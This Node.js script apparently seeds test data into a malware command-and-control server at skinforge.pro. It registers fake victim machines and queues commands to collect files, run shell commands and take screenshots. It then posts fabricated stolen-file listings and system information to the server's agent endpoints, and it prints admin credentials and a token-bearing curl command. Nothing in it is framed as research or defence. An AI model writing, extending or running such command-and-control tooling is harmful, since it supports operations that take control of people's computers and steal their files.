const fetch = require('node-fetch');

const C2_SERVER = 'https://skinforge.pro';
const ADMIN_USER = process.env.ADMIN_USER;
const ADMIN_PASS = process.env.ADMIN_PASS;
const ADMIN_TOKEN = Buffer.from(`${ADMIN_USER}:${ADMIN_PASS}`).toString('base64');

async function insertFakeData() {
    console.log('🚀 Inserting fake C2 data for dashboard testing...\n');

    try {
        // 1. Register fake agents
        const agents = [
            {
                agent_id: 'RUST_AGENT_V1',
                hostname: 'DESKTOP-ABC123',
                username: 'john.doe',
                os_info: 'Windows 10 x64 | CPU: 8 cores | RAM: 16GB',
                ip_address: '192.168.1.100'
            },
            {
                agent_id: 'PYTHON_AGENT_001',
                hostname: 'LAPTOP-XYZ789',
                username: 'jane.smith',
                os_info: 'Windows 11 x64 | CPU: 12 cores | RAM: 32GB',
                ip_address: '192.168.1.101'
            },
            {
                agent_id: 'CPP_AGENT_WIN',
                hostname: 'WORKSTATION-001',
                username: 'admin',
                os_info: 'Windows 10 x64 | CPU: 16 cores | RAM: 64GB',
                ip_address: '192.168.1.102'
            }
        ];

        console.log('📝 Registering agents...');
        for (const agent of agents) {
            const response = await fetch(`${C2_SERVER}/api/c2/register`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(agent)
            });
            console.log(`   ${agent.agent_id}: ${response.ok ? '✅' : '❌'}`);
        }

        // 2. Create fake commands
        const commands = [
            {
                agent_id: 'RUST_AGENT_V1',
                command_type: 'collect_files',
                command_data: '*.txt|10'
            },
            {
                agent_id: 'RUST_AGENT_V1',
                command_type: 'shell',
                command_data: 'whoami'
            },
            {
                agent_id: 'PYTHON_AGENT_001',
                command_type: 'collect_data',
                command_data: 'system_info'
            },
            {
                agent_id: 'PYTHON_AGENT_001',
                command_type: 'shell',
                command_data: 'ipconfig'
            },
            {
                agent_id: 'CPP_AGENT_WIN',
                command_type: 'screenshot',
                command_data: 'capture_screen'
            },
            {
                agent_id: 'CPP_AGENT_WIN',
                command_type: 'collect_files',
                command_data: '*.pdf|5'
            }
        ];

        console.log('\n📋 Creating commands...');
        const commandIds = [];
        for (const cmd of commands) {
            const response = await fetch(`${C2_SERVER}/api/admin/c2/command`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${ADMIN_TOKEN}`
                },
                body: JSON.stringify(cmd)
            });
            
            if (response.ok) {
                const result = await response.json();
                commandIds.push(result.command_id);
                console.log(`   ${cmd.command_type} for ${cmd.agent_id}: ✅ (ID: ${result.command_id})`);
            } else {
                console.log(`   ${cmd.command_type} for ${cmd.agent_id}: ❌`);
            }
        }

        // 3. Submit fake results
        const results = [
            {
                command_id: commandIds[0],
                agent_id: 'RUST_AGENT_V1',
                result_data: JSON.stringify({
                    files_collected: [
                        { filename: 'document1.txt', size: 2048, path: 'C:/Users/john.doe/Documents/document1.txt' },
                        { filename: 'notes.txt', size: 1024, path: 'C:/Users/john.doe/Desktop/notes.txt' },
                        { filename: 'config.txt', size: 512, path: 'C:/Users/john.doe/AppData/config.txt' }
                    ],
                    total_files: 3,
                    total_size: 3584
                }),
                success: true
            },
            {
                command_id: commandIds[1],
                agent_id: 'RUST_AGENT_V1',
                result_data: 'DESKTOP-ABC123\\john.doe',
                success: true
            },
            {
                command_id: commandIds[2],
                agent_id: 'PYTHON_AGENT_001',
                result_data: JSON.stringify({
                    platform: 'Windows-11-10.0.22000-SP0',
                    machine: 'AMD64',
                    processor: 'Intel64 Family 6 Model 142 Stepping 12, GenuineIntel',
                    python_version: '3.9.7',
                    hostname: 'LAPTOP-XYZ789',
                    username: 'jane.smith',
                    ip_address: '192.168.1.101'
                }),
                success: true
            },
            {
                command_id: commandIds[3],
                agent_id: 'PYTHON_AGENT_001',
                result_data: `Windows IP Configuration

Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  . : local
   IPv4 Address. . . . . . . . . . . : 192.168.1.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1

Wireless LAN adapter Wi-Fi:
   Media State . . . . . . . . . . . : Media disconnected`,
                success: true
            },
            {
                command_id: commandIds[4],
                agent_id: 'CPP_AGENT_WIN',
                result_data: 'Screenshot captured successfully',
                success: true
            },
            {
                command_id: commandIds[5],
                agent_id: 'CPP_AGENT_WIN',
                result_data: '',
                error_message: 'No PDF files found in specified directories',
                success: false
            }
        ];

        console.log('\n📤 Submitting results...');
        for (const result of results) {
            const response = await fetch(`${C2_SERVER}/api/c2/result`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(result)
            });
            console.log(`   Command ${result.command_id}: ${response.ok ? '✅' : '❌'}`);
        }

        console.log('\n🎉 Fake data insertion completed!');
        console.log('\n📊 Summary:');
        console.log('- 3 agents registered');
        console.log('- 6 commands created');
        console.log('- 6 results submitted');
        console.log('\n🌐 You can now view the data in your C2 dashboard:');
        console.log(`https://skinforge.pro/admin (login with ${ADMIN_USER}/${ADMIN_PASS})`);
        console.log('\n🔍 Or check the API directly:');
        console.log(`curl -H "Authorization: Bearer ${ADMIN_TOKEN}" ${C2_SERVER}/api/admin/c2/results`);

    } catch (error) {
        console.error('❌ Error inserting fake data:', error.message);
    }
}

// Run the script
insertFakeData(); 